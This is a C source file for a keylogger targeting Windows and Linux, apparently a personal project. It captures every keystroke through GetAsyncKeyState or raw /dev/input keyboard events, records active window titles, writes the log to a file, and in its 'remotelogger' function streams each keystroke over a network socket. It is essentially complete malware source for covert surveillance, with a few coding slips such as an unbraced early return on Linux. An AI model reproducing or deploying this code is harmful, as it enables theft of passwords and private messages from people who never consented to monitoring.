//
// Created by mallo on 13/12/2022.
//

#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include "keylogger.h"

int running = 1;
unsigned char string_buffer[256];

void quitHandler(int sig){
    running = 0;
}

void setSessionStartLog() {
    char* platform;
    char* codec;
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    #if defined PLATFORM_WINDOWS
        platform = "WINDOWS";
        codec = "unicode";
    #endif
    #if defined(PLATFORM_LINUX)
        platform = "LINUX";
        codec = "see linux/input.h";
    #endif

    sprintf(string_buffer,
            "\nLOGGING SESSION START: %d-%02d-%02d %02d:%02d:%02d "
            "\nPLATFORM: %s\nCODEC: %s",
            tm.tm_year + 1900,
            tm.tm_mon + 1,
            tm.tm_mday,
            tm.tm_hour,
            tm.tm_min,
            tm.tm_sec,
            platform,
            codec);
}

void setSessionEndLog() {
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    sprintf(string_buffer,
            "\nLOGGING SESSION END: %d-%02d-%02d %02d:%02d:%02d",
            tm.tm_year + 1900,
            tm.tm_mon + 1,
            tm.tm_mday,
            tm.tm_hour,
            tm.tm_min,
            tm.tm_sec);
}

#if defined PLATFORM_WINDOWS
    #include <windows.h>
    #define BUFLEN 4096

    HWND wincurrent, winlast;
    unsigned char buffer[BUFLEN];

    void searchActiveWindow(void) {
        wincurrent = GetForegroundWindow();
        if(wincurrent != winlast) {
            winlast = wincurrent;
            int err = GetWindowText(wincurrent, string_buffer, 256); /* primo metodo */
            if(err != 0) {
                if(strlen(string_buffer) == 0) sprintf(buffer, "\r\n[>>> ??? <<<]");
                else sprintf(buffer, "\r\n[>>> %.256s <<<]", string_buffer);
            }
             /* non ha funzionato... secondo metodo */
            else {
                SendMessage(wincurrent, WM_GETTEXT, (WPARAM)256, (LPARAM)string_buffer);
                if(strlen(string_buffer) == 0) sprintf(buffer, "\r\n[>>> ??? <<<]");
                else sprintf(buffer, "\r\n[>>> %.256s <<<]", string_buffer);
            }
        }
    }

    void convert(int keycode) {
        if((keycode>=0x30)&&(keycode<=0x39)) { /* numbers */
            sprintf(string_buffer, "\r\n%c", keycode); return;
        }

        if((keycode>=0x41)&&(keycode<=0x5A)) { /* upper/lower case characters */
            if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000)) sprintf(string_buffer, "\r\n%c", keycode);
            else sprintf(string_buffer, "\r\n%c", keycode + 0x20);
            return;
        }

        switch(keycode) {
            case VK_LEFT: sprintf(string_buffer, "\r\nLEFT");return;
            case VK_UP: sprintf(string_buffer, "\r\nUP");return;
            case VK_RIGHT: sprintf(string_buffer, "\r\nRIGHT");return;
            case VK_DOWN: sprintf(string_buffer, "\r\nDOWN");return;
        }

        switch(keycode) {
            case VK_F1: sprintf(string_buffer, "\r\nF1");return;
            case VK_F2: sprintf(string_buffer, "\r\nF2");return;
            case VK_F3: sprintf(string_buffer, "\r\nF3");return;
            case VK_F4: sprintf(string_buffer, "\r\nF4");return;
            case VK_F5: sprintf(string_buffer, "\r\nF5");return;
            case VK_F6: sprintf(string_buffer, "\r\nF6");return;
            case VK_F7: sprintf(string_buffer, "\r\nF7");return;
            case VK_F8: sprintf(string_buffer, "\r\nF8");return;
            case VK_F9: sprintf(string_buffer, "\r\nF9");return;
            case VK_F10: sprintf(string_buffer, "\r\nF10");return;
            case VK_F11: sprintf(string_buffer, "\r\nF11");return;
            case VK_F12: sprintf(string_buffer, "\r\nF12");return;
        }

        switch(keycode) { /* special characters */
            case VK_ESCAPE: sprintf(string_buffer, "\r\nESC");return;
            case VK_DELETE: sprintf(string_buffer, "\r\nDEL");return;
            case VK_SPACE: sprintf(string_buffer, "\r\nSPACE");return;
            case VK_RETURN: sprintf(string_buffer, "\r\nENTER");return;
            case VK_BACK: sprintf(string_buffer, "\r\nBACKSPACE");return;
            case VK_LSHIFT: sprintf(string_buffer, "\r\nLEFTSHIFT");return;
            case VK_RSHIFT: sprintf(string_buffer, "\r\nRIGHTSHIFT");return;
            case VK_LCONTROL: sprintf(string_buffer, "\r\nLEFTCONTROL");return;
            case VK_RCONTROL: sprintf(string_buffer, "\r\nRIGHTCONTROL");return;
            case VK_TAB: sprintf(string_buffer, "\r\nTAB");return;
            case VK_SUBTRACT: sprintf(string_buffer, "\r\nMINUS");return;
            case VK_ADD: sprintf(string_buffer, "\r\nPLUS");return;
            case VK_NUMLOCK: sprintf(string_buffer, "\r\nNUMLOCK");return;
            case VK_SCROLL: sprintf(string_buffer, "\r\nSCROLLLOCK");return;
        }

        sprintf(string_buffer, "\r\nUNRECOGNIZED: %d", keycode); return;
    }

    void remotelogger(int s) {
        signal(SIGINT, quitHandler);
        signal(SIGTERM, quitHandler);

        setSessionStartLog();
        send(s , string_buffer, strlen(string_buffer), 0);

        while(running) {
            for (int i = 0; i < 256; i++) {
                char key = GetAsyncKeyState(i);
                if (key > 0) {
                    convert(i);
                    send(s , string_buffer , strlen(string_buffer) , 0);
                    break;
                }
            }
            searchActiveWindow();
            Sleep(10);
        }

        setSessionEndLog();
        send(s , string_buffer , strlen(string_buffer) , 0);
    }

    void keylogger(int keyboard, FILE* writeout) {
        signal(SIGINT, quitHandler);
        signal(SIGTERM, quitHandler);

        setSessionStartLog();
        fprintf(writeout, string_buffer);

        while(running) {
            for (int i = 0; i < 256; i++) {
                char key = GetAsyncKeyState(i);
                if (key > 0) {
                    convert(i);
                    fprintf(writeout, string_buffer);
                    break;
                }
            }
            searchActiveWindow();
            Sleep(10); /* previene la saturazione della CPU */
        }

        setSessionEndLog();
        fprintf(writeout, string_buffer);
    }
#endif

#if defined(PLATFORM_LINUX)
    #include <linux/input.h>
    #include <sys/ioctl.h>

    #define INPUT_DIR "/dev/input/"
    #define NUM_EVENTS 128
    #define STANDARD_KEY_COUNT 84

    int eventSize = sizeof(struct input_event);
    struct input_event events[NUM_EVENTS];
    int i;

    const char *standardKeyCodes[] = {
            "RESERVED","ESC",
            "1","2","3","4","5","6","7","8","9","0",
            "MINUS","EQUAL","BACKSPACE","TAB",
            "q","w","e","r","t","y","u","i","o","p",
            "LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL",
            "a","s","d","f","g","h","j","k","l",
            "SEMICOLON","APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH",
            "z","x","c","v","b","n","m",
            "COMMA","DOT","SLASH","RIGHTSHIFT","ASTERISK","LEFTALT","SPACE","CAPSLOCK",
            "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10",
            "NUMLOCK","SCROLLLOCK",
            "7", "8", "9", "MINUS", "4", "5", "6",
            "PLUS", "1", "2", "3", "0", "DOT"
    };

    int bytesRead = 0;

    static int is_char_device(const struct dirent *file){
        struct stat filestat;
        char filename[512];
        int err;

        snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);

        err = stat(filename, &filestat);
        if(err){
            return 0;
        }

        return S_ISCHR(filestat.st_mode);
    }

    // Some of this implementation is based on lessons learned from the following:
    // http://unix.stackexchange.com/questions/94322/is-it-possible-for-a-daemon-i-e-background-process-to-look-for-key-presses-fr/94329#94329
    char *get_keyboard_event_file(void){
        char *keyboard_file = NULL;
        int num, i;
        struct dirent **event_files;
        char filename[512];

        num = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
        if(num < 0){
            return NULL;
        }

        else {
            for(i = 0; i < num; ++i){
                int32_t event_bitmap = 0;
                int fd;
                int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

                snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
                fd = open(filename, O_RDONLY);

                if(fd == -1){
                    perror("open");
                    continue;
                }

                ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
                if((EV_KEY & event_bitmap) == EV_KEY){
                    // The device acts like a keyboard

                    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                    if((kbd_bitmap & event_bitmap) == kbd_bitmap){
                        // The device supports A, B, C, Z keys, so it probably is a keyboard
                        keyboard_file = strdup(filename);
                        close(fd);
                        break;
                    }

                }
                close(fd);
            }
        }

        // Cleanup scandir
        for(i = 0; i < num; ++i){
            free(event_files[i]);
        }

        free(event_files);

        return keyboard_file;

    }

    void convert(int keyCode) {
        if(keyCode > 0 && keyCode < STANDARD_KEY_COUNT)
            sprintf(string_buffer,"\r\n%s", standardKeyCodes[keyCode]); return;

        switch (keyCode) { /* Special characters */
            case KEY_F11: sprintf(string_buffer,"\r\n%s", "F11"); return;
            case KEY_F12: sprintf(string_buffer,"\r\n%s", "F12"); return;
            case KEY_KPENTER: sprintf(string_buffer,"\r\n%s", "ENTER"); return;
            case KEY_KPSLASH: sprintf(string_buffer,"\r\n%s", "SLASH"); return;
            case KEY_RIGHTALT: sprintf(string_buffer,"\r\n%s", "RIGHTALT"); return;
            case KEY_RIGHTCTRL: sprintf(string_buffer,"\r\n%s", "RIGHTCONTROL"); return;
        }

        switch (keyCode) { /* Arrows */
            case KEY_UP: sprintf(string_buffer,"\r\n%s", "UP"); return;
            case KEY_LEFT: sprintf(string_buffer,"\r\n%s", "LEFT"); return;
            case KEY_RIGHT: sprintf(string_buffer,"\r\n%s", "RIGHT"); return;
            case KEY_DOWN: sprintf(string_buffer,"\r\n%s", "DOWN"); return;
        }

        sprintf(string_buffer,"\r\nUNRECOGNIZED: %d", keyCode); return;
    }

    void keylogger(int keyboard, FILE* writeout) {
        signal(SIGINT, quitHandler);
        signal(SIGTERM, quitHandler);

        setSessionStartLog();
        fprintf(writeout, string_buffer);

        while(running){
            bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

            for(i = 0; i < (bytesRead / eventSize); ++i){
                if(events[i].type == EV_KEY){
                    if(events[i].value == 1){
                        convert(events[i].code);
                        fprintf(writeout, string_buffer);
                    }
                }
            }
        }

        setSessionEndLog();
        fprintf(writeout, string_buffer);
    }
#endif



